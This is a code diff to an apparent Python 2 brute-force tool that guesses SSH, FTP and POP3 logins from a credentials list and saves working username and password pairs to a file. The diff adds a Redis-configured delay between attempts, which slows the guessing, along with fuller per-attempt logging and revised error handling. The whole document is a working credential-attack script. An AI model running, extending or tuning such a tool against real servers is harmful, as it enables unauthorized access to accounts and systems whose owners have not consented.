@@ -1,5 +1,5 @@
 #!/usr/bin/python
-import redis, paramiko, socket, datetime, os, sys, subprocess, uuid
+import redis, paramiko, socket, datetime, os, sys, subprocess, uuid, time
 from ftplib import FTP
 from poplib import POP3
 
@@ -49,6 +49,7 @@ def SSHBrute(host, port):
 
 		print log("SSH Bruteforce attempt '%i' on host '%s' port '%s' with username '%s' and password '%s'" %(attempt, host, port, tstusername, tstpassword))
 
+		time.sleep(int(r_server.get("Delay")))
 
 		client = paramiko.SSHClient()
 		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -61,25 +62,20 @@ def SSHBrute(host, port):
 			outfile.close()
 			client.close()
 		except paramiko.AuthenticationException, error:
-			print log("Incorrect credentials User: %s and Password: %s" % (tstusername, tstpassword))
+			print log("Attempt: %i - Incorrect credentials User: %s and Password: %s for host %s and SSH protocol" % (attempt, tstusername, tstpassword, host))
 			continue
 		except socket.timeout:
-			print log("Connection Timeout")
+			print log("Attempt: %i, host %s , user %s and password %s - Connection Timeout" %(attempt, host, tstusername, tstpassword))
 			break
-		except socket.error as E:
-			if E.errno == 61:
-				print log("Connection refused")
-				break
 		except socket.error, error:
-			print error
-			continue
+			print log("Attempt: %i, host %s , user %s and password %s - Error: %s" %(attempt, host, tstusername, tstpassword, error))
+			break
 		except paramiko.SSHException, error:
-			print error
-			print "Most probably this is caused by a missing host key"
-			continue
+			print log("Attempt: %i, host %s , user %s and password %s - Error: %s \nMost probably this is caused by a missing host key" %(attempt, host, tstusername, tstpassword, error))
+			break
 		except Exception, error:
-			print error
-			print "Unknown error: %s" % (error)
+			print log("Attempt: %i, host %s , user %s and password %s - Unknown error: %s" %(attempt, host, tstusername, tstpassword, error))
+			break
 		client.close()
 
 	credentials.close()
@@ -117,32 +113,31 @@ def FTPBrute(host, port):
 
 		print log("FTP Bruteforce attempt '%i' on host '%s' port '%s' with username '%s' and password '%s'" %(attempt, host, port, tstusername, tstpassword))
 
+		time.sleep(int(r_server.get("Delay")))
+
 		try:
 			ftpclient = FTP()
 			ftpclient.connect(host=host, port=int(port), timeout=10)			
 			ftpclient.login(tstusername, tstpassword)
-			login = log('Sucessful FTP authentication with username %s and password %s' % (tstusername, tstpassword))
+			login = log('Sucessful FTP authentication with username %s and password %s' %(tstusername, tstpassword))
 			print login
 			outfile = open("validpasses.txt", 'a')
 			outfile.write(login + '\n')
 			outfile.close()
 			ftpclient.close()
 		except socket.timeout:
-			print log("Connection Timeout")
+			print log("Attempt: %i, host %s , user %s and password %s - Connection Timeout" %(attempt, host, tstusername, tstpassword))
 			break
-		except socket.error as E:
-			if E.errno == 61:
-				print log("Connection refused")
-				break
-		except socket.error as E:
-			print log("   connection failed (socket.error) = %s" % (E))
-			continue
 		except socket.error, error:
-			print error
-			continue
+			print log("Attempt: %i, host %s , user %s and password %s - Error %s" %(attempt, host, tstusername, tstpassword, error))
+			break
 		except Exception as E:
-			print log("   generic exception = %s" % (E))
-			continue
+			if (str(E) == "530 Login authentication failed"):
+				print log("Attempt: %i - Incorrect credentials User: %s and Password: %s for host %s and FTP protocol" %(attempt, tstusername, tstpassword, host))
+				continue
+			else:
+				print log("Attempt: %i, host %s , user %s and password %s - generic exception = %s" %(attempt, host, tstusername, tstpassword, E))
+				break
 	credentials.close()
 
 
@@ -176,32 +171,31 @@ def POPBrute(host, port):
 			outfile2.close()
 			break
 
-		print log("FTP Bruteforce attempt '%i' on host '%s' port '%s' with username '%s' and password '%s'" %(attempt, host, port, tstusername, tstpassword))
+		print log("POP3 Bruteforce attempt '%i' on host '%s' port '%s' with username '%s' and password '%s'" %(attempt, host, port, tstusername, tstpassword))
+
+		time.sleep(int(r_server.get("Delay")))
 
 		try:
 			client = POP3(host=host, port=int(port), timeout=10)
 			client.user(tstusername)
 			client.pass_(tstpassword)
-			login = log('Sucessful POP3 authentication with username %s and password %s' % (tstusername, tstpassword))
+			login = log('Sucessful POP3 authentication with username %s and password %s' %(tstusername, tstpassword))
 			print login
 			outfile = open("validpasses.txt", 'a')
 			outfile.write(login + '\n')
 			outfile.close()
 			client.quit()
 		except socket.timeout:
-			print log("Connection Timeout")
+			print log("Attempt: %i, host %s , user %s and password %s - Connection Timeout" %(attempt, host, tstusername, tstpassword))
 			break
-		except socket.error as E:
-			if E.errno == 61:
-				print log("Connection refused")
-				break
-		except socket.error as E:
-			print log("   connection failed (socket.error) = %s" % (E))
-			continue
 		except socket.error, error:
-			print error
-			continue
+			print log("Attempt: %i, host %s , user %s and password %s - %s" %(attempt, host, tstusername, tstpassword, error))
+			break
 		except Exception as E:
-			print log("   generic exception = %s" % (E))
-			continue
+			if (str(E) == "-ERR Unable to log on"):
+				print log("Attempt: %i - Incorrect credentials User: %s and Password: %s for host %s and POP3 protocol" %(attempt, tstusername, tstpassword, host))
+				continue
+			else:
+				print log("Attempt: %i, host %s , user %s and password %s - generic exception = %s" %(attempt, host, tstusername, tstpassword, E))
+				break
 	credentials.close()
